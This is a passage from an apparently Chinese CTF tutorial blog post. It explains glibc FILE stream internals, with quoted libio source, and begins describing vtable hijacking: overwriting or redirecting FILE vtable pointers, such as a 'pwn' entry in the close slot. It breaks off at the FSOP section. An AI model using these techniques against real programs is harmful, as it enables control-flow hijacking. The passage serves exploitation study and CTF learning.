class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sqf">struct <span class="hljs-variable">_IO_FILE</span> &#123;<br>  int <span class="hljs-variable">_flags</span>;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* <span class="hljs-doctag">Note:</span>  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  char* <span class="hljs-variable">_IO_read_ptr</span>;   <span class="hljs-comment">/* Current read pointer */</span><br>  char* <span class="hljs-variable">_IO_read_end</span>;   <span class="hljs-comment">/* End of get area. */</span><br>  char* <span class="hljs-variable">_IO_read_base</span>;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  char* <span class="hljs-variable">_IO_write_base</span>; <span class="hljs-comment">/* Start of put area. */</span><br>  char* <span class="hljs-variable">_IO_write_ptr</span>;  <span class="hljs-comment">/* Current put pointer. */</span><br>  char* <span class="hljs-variable">_IO_write_end</span>;  <span class="hljs-comment">/* End of put area. */</span><br>  char* <span class="hljs-variable">_IO_buf_base</span>;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  char* <span class="hljs-variable">_IO_buf_end</span>;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  char *<span class="hljs-variable">_IO_save_base</span>; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  char *<span class="hljs-variable">_IO_backup_base</span>;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  char *<span class="hljs-variable">_IO_save_end</span>; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  struct <span class="hljs-variable">_IO_marker</span> *<span class="hljs-variable">_markers</span>;<br><br>  struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_chain</span>;<br><br>  int <span class="hljs-variable">_fileno</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  int <span class="hljs-variable">_blksize</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  int <span class="hljs-variable">_flags2</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-variable">_IO_off_t</span> <span class="hljs-variable">_old_offset</span>; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  unsigned short <span class="hljs-variable">_cur_column</span>;<br>  signed char <span class="hljs-variable">_vtable_offset</span>;<br>  char <span class="hljs-variable">_shortbuf</span>[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  <span class="hljs-variable">_IO_lock_t</span> *<span class="hljs-variable">_lock</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>而FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60<br>链表头部用_IO_list_all指针表示。</p><p>_IO_list_all-&gt;stderr-&gt;stdout-&gt;stdin构成链表</p><p>在正常情况下,程序启动会伴随着:stdin,stdout,stderr三个文件流一起开启,这三个流位于libc.so的数据段</p><p>但是我们使用fopen等文件输入输出函数时所创建的文件流位于堆上</p><p><em>但是其实_IO_File结构体外面还有一层</em></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">struct</span> _IO_FILE_plus<br>&#123;<br>    <span class="hljs-attribute">_IO_FILE</span>    file;<br>    <span class="hljs-attribute">IO_jump_t</span>   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>而IO_jump_t *vtable保存了很多的函数指针,偏移为0xd8</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">void * funcs[] = &#123;<br>   <span class="hljs-number">1</span> NULL, <span class="hljs-regexp">//</span> <span class="hljs-string">&quot;extra word&quot;</span><br>   <span class="hljs-number">2</span> NULL, <span class="hljs-regexp">//</span> DUMMY<br>   <span class="hljs-number">3</span> <span class="hljs-keyword">exit</span>, <span class="hljs-regexp">//</span> finish<br>   <span class="hljs-number">4</span> NULL, <span class="hljs-regexp">//</span> overflow<br>   <span class="hljs-number">5</span> NULL, <span class="hljs-regexp">//</span> underflow<br>   <span class="hljs-number">6</span> NULL, <span class="hljs-regexp">//</span> uflow<br>   <span class="hljs-number">7</span> NULL, <span class="hljs-regexp">//</span> pbackfail<br>   <br>   <span class="hljs-number">8</span> NULL, <span class="hljs-regexp">//</span> xsputn  <span class="hljs-comment">#printf</span><br>   <span class="hljs-number">9</span> NULL, <span class="hljs-regexp">//</span> xsgetn<br>   <span class="hljs-number">10</span> NULL, <span class="hljs-regexp">//</span> seekoff<br>   <span class="hljs-number">11</span> NULL, <span class="hljs-regexp">//</span> seekpos<br>   <span class="hljs-number">12</span> NULL, <span class="hljs-regexp">//</span> setbuf<br>   <span class="hljs-number">13</span> NULL, <span class="hljs-regexp">//</span> sync<br>   <span class="hljs-number">14</span> NULL, <span class="hljs-regexp">//</span> doallocate<br>   <span class="hljs-number">15</span> NULL, <span class="hljs-regexp">//</span> read<br>   <span class="hljs-number">16</span> NULL, <span class="hljs-regexp">//</span> write<br>   <span class="hljs-number">17</span> NULL, <span class="hljs-regexp">//</span> seek<br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-regexp">//</span> close<br>   <span class="hljs-number">19</span> NULL, <span class="hljs-regexp">//</span> stat<br>   <span class="hljs-number">20</span> NULL, <span class="hljs-regexp">//</span> showmanyc<br>   <span class="hljs-number">21</span> NULL, <span class="hljs-regexp">//</span> imbue<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h1><h2 id="vtable-hijacker"><a href="#vtable-hijacker" class="headerlink" title="vtable hijacker"></a>vtable hijacker</h2><h3 id="一些小函数"><a href="#一些小函数" class="headerlink" title="一些小函数"></a>一些小函数</h3><p>为什么可以通过劫持vtable指针来控制程序执行流呢?我们来看几个日常使用的函数调用方法，这里ctf-wiki也有讲，我就不过多阐述:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">fread</span>(从文件流中读数据)<br><span class="hljs-keyword">fwrite</span>（向文件流中写数据）<br><span class="hljs-keyword">fopen</span>（打开文件）<br><span class="hljs-keyword">fclose</span>（关闭文件）<br>printf/puts（输出）#这里要多嘴一句，没有变量的printf优化后就是去了<span class="hljs-string">&#x27;\n&#x27;</span>的puts<br></code></pre></td></tr></table></figure><ol><li>fread</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">// libio/iofread.c</span><br><br>_IO_size_t<br>_IO_fread (<span class="hljs-keyword">void</span> *buf, _IO_size_t <span class="hljs-keyword">size</span>, _IO_size_t <span class="hljs-keyword">count</span>, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t bytes_requested = <span class="hljs-keyword">size</span> * <span class="hljs-keyword">count</span>;<br>  _IO_size_t bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-keyword">char</span> *) buf, bytes_requested);   <span class="hljs-comment">// 调用 _IO_sgetn 函数</span><br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? <span class="hljs-keyword">count</span> : bytes_read / <span class="hljs-keyword">size</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>而其中的_IO_sgetn函数原型是：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">_IO_size_t</span><br><span class="hljs-symbol">_IO_sgetn</span> (<span class="hljs-built_in">fp</span>, <span class="hljs-meta">data</span>, n)<br>     _IO_FILE *<span class="hljs-built_in">fp</span><span class="hljs-comment">;</span><br>     void *<span class="hljs-meta">data</span><span class="hljs-comment">;</span><br>     _IO_size_t n<span class="hljs-comment">;</span><br>&#123;<br>  return _IO_XSGETN (<span class="hljs-built_in">fp</span>, <span class="hljs-meta">data</span>, n)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>而_IO_XSGETN则是vtable的变量之一（9），调用这个函数前会先取出vtable中的指针然后调用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// libio/libioP.h</span><br><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_JUMPS_FILE_plus</span>(THIS) \<br>  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)<br><br><span class="hljs-selector-id">#if</span> _IO_JUMPS_OFFSET<br># define <span class="hljs-built_in">_IO_JUMPS_FUNC</span>(THIS) \<br> (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \<br>               + (THIS)-&gt;_vtable_offset))<br># define <span class="hljs-built_in">_IO_vtable_offset</span>(THIS) (THIS)-&gt;_vtable_offset<br><span class="hljs-selector-id">#else</span><br># define <span class="hljs-built_in">_IO_JUMPS_FUNC</span>(THIS) _IO_JUMPS_FILE_plus (THIS)<br># define <span class="hljs-built_in">_IO_vtable_offset</span>(THIS) <span class="hljs-number">0</span><br><span class="hljs-selector-id">#endif</span><br><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">JUMP2</span>(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)<br><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_XSGETN</span>(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)<br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// libio/fileops.c</span><br><br><span class="hljs-variable">_IO_size_t</span><br><span class="hljs-variable">_IO_file_xsgetn</span> (<span class="hljs-variable">_IO_FILE</span> *fp, void *data, <span class="hljs-variable">_IO_size_t</span> n)<br>&#123;<br></code></pre></td></tr></table></figure><ol start="2"><li>fwrite</li></ol><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// libio/iofwrite.c</span><br><br><span class="hljs-variable">_IO_size_t</span><br><span class="hljs-variable">_IO_fwrite</span> (const void *buf, <span class="hljs-variable">_IO_size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-variable">_IO_size_t</span> <span class="hljs-built_in">count</span>, <span class="hljs-variable">_IO_FILE</span> *fp)<br>&#123;<br>  <span class="hljs-variable">_IO_size_t</span> request = <span class="hljs-built_in">size</span> * <span class="hljs-built_in">count</span>;<br>  <span class="hljs-variable">_IO_size_t</span> written = <span class="hljs-number">0</span>;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (request == <span class="hljs-number">0</span>)<br>    return <span class="hljs-number">0</span>;<br>  <span class="hljs-variable">_IO_acquire_lock</span> (fp);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">_IO_vtable_offset</span> (fp) != <span class="hljs-number">0</span> || <span class="hljs-variable">_IO_fwide</span> (fp, -<span class="hljs-number">1</span>) == -<span class="hljs-number">1</span>)<br>    written = <span class="hljs-variable">_IO_sputn</span> (fp, (const char *) buf, request);      <span class="hljs-comment">// 调用 _IO_sputn 函数</span><br>  <span class="hljs-variable">_IO_release_lock</span> (fp);<br>  <span class="hljs-comment">/* We have written all of the input in case the return value indicates</span><br><span class="hljs-comment">     this or EOF is returned.  The latter is a special case where we</span><br><span class="hljs-comment">     simply did not manage to flush the buffer.  But the data is in the</span><br><span class="hljs-comment">     buffer and therefore written as far as fwrite is concerned.  */</span><br>  <span class="hljs-keyword">if</span> (written == request || written == EOF)<br>    return <span class="hljs-built_in">count</span>;<br>  <span class="hljs-keyword">else</span><br>    return written / <span class="hljs-built_in">size</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// libio/libioP.h</span><br><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_XSPUTN</span>(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)<br><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">_IO_sputn</span>(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)<br></code></pre></td></tr></table></figure><ul><li>fwrite会调用_IO_sputn，而这个对应了_IO_new_file_xsputn </li><li>调用vtabled的_IO_OVERFLOW，对应了_IO_new_file_overflow</li><li>调用系统调用write</li></ul><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// libio/fileops.c</span><br><br><span class="hljs-variable">_IO_size_t</span><br><span class="hljs-variable">_IO_new_file_xsputn</span> (<span class="hljs-variable">_IO_FILE</span> *f, const void *data, <span class="hljs-variable">_IO_size_t</span> n)<br>&#123;<br></code></pre></td></tr></table></figure><ol start="3"><li>fopen(借用ctf-wiki的总结)</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp">_IO_FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">locked_FILE</span><br>  &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IO_FILE_plus</span> fp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IO_wide_data</span> wd;<br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-built_in">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));   <span class="hljs-comment">// 为 FILE 结构分配空间</span><br><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;                                 <span class="hljs-comment">// 设置 vtable = &amp;_IO_file_jumps</span><br>  _IO_file_init (&amp;new_f-&gt;fp);                                               <span class="hljs-comment">// 调用 _IO_file_init 函数进行初始化</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span><br>  new_f-&gt;fp.vtable = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)    <span class="hljs-comment">// 打开目标文件</span><br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>_IO_FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// libio/fileops.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_file_init _IO_file_init</span><br><br><span class="hljs-keyword">void</span><br>_IO_new_file_init (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-comment">/* POSIX.1 allows another file handle to be used to change the position</span><br><span class="hljs-comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span><br><span class="hljs-comment">     position before we do the first fseek (and until a following fflush). */</span><br>  fp-&gt;<span class="hljs-keyword">file</span>._offset = _IO_pos_BAD;<br>  fp-&gt;<span class="hljs-keyword">file</span>._IO_file_flags |= CLOSED_FILEBUF_FLAGS;<br><br>  _IO_link_in (fp);         <span class="hljs-comment">// 调用 _IO_link_in 函数将 fp 放进链表</span><br>  fp-&gt;<span class="hljs-keyword">file</span>._fileno = <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// libio/genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;  <span class="hljs-comment">// fp 放到链表头部</span><br>      _IO_list_all = fp;                            <span class="hljs-comment">// 链表头 _IO_list_all 指向 fp</span><br>      ++_IO_list_all_stamp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><ol start="4"><li>fclose</li></ol><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">// libio/iofclose.c</span><br><br>int<br>_IO_new_fclose (_IO_FILE *fp)<br>&#123;<br>  int status;<br><br>  CHECK_FILE(fp, EOF);<br><br>#<span class="hljs-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)<br>  <span class="hljs-comment">/* We desperately try to help programs which are using streams in a</span><br><span class="hljs-comment">     strange way and mix old and new functions.  Detect old streams</span><br><span class="hljs-comment">     here.  */</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span>)<br>    return _IO_old_fclose (fp);<br>#endif<br><br>  <span class="hljs-comment">/* First unlink the stream.  */</span><br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((struct _IO_FILE_plus *) fp);  <span class="hljs-comment">// 将 fp 从链表中取出</span><br><br>  _IO_acquire_lock (fp);<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);            <span class="hljs-comment">// 关闭目标文件</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-function"><span class="hljs-title">status</span> = fp-&gt;</span>_flags &amp; _IO_ERR_SEEN ? -<span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>  _IO_release_lock (fp);<br>  _IO_FINISH (fp);<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>#<span class="hljs-keyword">if</span> _LIBC<br>      <span class="hljs-comment">/* This stream has a wide orientation.  This means we have to free</span><br><span class="hljs-comment">     the conversion functions.  */</span><br>      <span class="hljs-function"><span class="hljs-title">struct</span> _IO_codecvt *cc = fp-&gt;</span>_codecvt;<br><br>      __libc_lock_lock (__gconv_lock);<br>      __<span class="hljs-function"><span class="hljs-title">gconv_release_step</span> (cc-&gt;</span>__cd_in.__cd.__steps);<br>      __<span class="hljs-function"><span class="hljs-title">gconv_release_step</span> (cc-&gt;</span>__cd_out.__cd.__steps);<br>      __libc_lock_unlock (__gconv_lock);<br>#endif<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>    _IO_free_backup_area (fp);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)<br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_file_flags = <span class="hljs-number">0</span>;<br>      free(fp);                                 <span class="hljs-comment">// 释放 FILE 结构体</span><br>    &#125;<br><br>  return status;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>调用_IO_unlink_it将指定的结构体从链表中移除</li><li>调用_IO_file_close_it 函数,调用系统调用关闭文件</li><li>调用vtable中的_IO_FINISH即（_IO_file_finish函数)</li><li>free掉之前的File结构体</li></ul><ol start="5"><li>printf&#x2F;puts（和fwrite类似）</li></ol><ul><li>vfprintf+11</li><li>_IO_file_xsputn</li><li>_IO_file_overflow</li><li>funlockfile</li><li>_IO_file_write</li><li>write</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用手法分为两种：</p><ul><li>通过任意地址写直接改写vtable的函数指针</li><li>覆盖vtable的函数指针，让其指向我们能控制的内存</li></ul><p><strong>我们要知道的是在libc2.23之前才可以更改虚表，libc-2.24之后加入了防御机制</strong></p><h3 id="FSOP（libc版本"><a href="#FSOP（libc版本" class="headerlink" 